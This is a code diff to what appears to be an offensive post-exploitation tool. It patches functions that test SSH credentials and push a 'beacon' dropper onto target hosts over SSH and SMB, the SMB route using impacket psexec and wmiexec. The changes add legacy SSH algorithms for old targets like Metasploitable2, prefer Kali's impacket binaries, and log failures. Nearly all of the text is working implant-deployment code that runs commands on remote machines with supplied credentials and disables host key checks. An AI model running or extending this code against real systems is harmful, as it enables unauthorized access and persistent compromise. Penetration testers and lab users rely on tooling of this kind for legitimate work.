@@ -348,6 +348,9 @@ def _verify_ssh(target: str, port: int, username: str, password: str) -> Optiona
             "-o", "UserKnownHostsFile=/dev/null",
             "-o", "ConnectTimeout=3",
             "-o", "BatchMode=yes",
+            # Legacy algorithms for older targets like Metasploitable2
+            "-o", "KexAlgorithms=+diffie-hellman-group1-sha1",
+            "-o", "HostKeyAlgorithms=+ssh-rsa",
             f"{username}@{target}", "-p", str(port),
             "echo OK",
         ]
@@ -680,6 +683,9 @@ def deploy_beacon_via_ssh(
             "ssh", "-o", "StrictHostKeyChecking=no",
             "-o", "UserKnownHostsFile=/dev/null",
             "-o", "ConnectTimeout=5",
+            # Legacy algorithms for older targets like Metasploitable2
+            "-o", "KexAlgorithms=+diffie-hellman-group1-sha1",
+            "-o", "HostKeyAlgorithms=+ssh-rsa",
             f"{username}@{target}", "-p", str(port),
             dropper,
         ]
@@ -707,21 +713,24 @@ def deploy_beacon_via_smb(
     # Prova psexec prima, poi wmiexec come fallback
     for tool in ["psexec", "wmiexec"]:
         try:
-            cmd = [
-                "python3", "-m", f"impacket.{tool}",
-                f"{username}:{password}@{target}",
-                dropper,
-            ]
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
+            # Try impacket-psexec (common in Kali) or python3 -m impacket.psexec
+            if shutil.which(f"impacket-{tool}"):
+                cmd = [f"impacket-{tool}", f"{username}:{password}@{target}", dropper]
+            else:
+                cmd = ["python3", "-m", f"impacket.{tool}", f"{username}:{password}@{target}", dropper]
+                
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
             if result.returncode == 0:
                 notifier.success(f"Beacon deployed via SMB {tool} to {target}")
                 return True, result.stdout
-        except (subprocess.TimeoutExpired, OSError):
-            continue
-        except Exception:
+            else:
+                # If specific tool fails, log it but continue to next
+                notifier.warn(f"SMB {tool} failed: {result.stderr[:100]}")
+        except (subprocess.TimeoutExpired, OSError) as e:
+            notifier.warn(f"SMB {tool} error: {str(e)}")
             continue
 
-    return False, "SMB deployment failed (psexec and wmiexec both failed)"
+    return False, "SMB deployment failed (psexec and wmiexec both failed). Check credentials and target share access."
 
 
 def deploy_beacon_via_ftp(
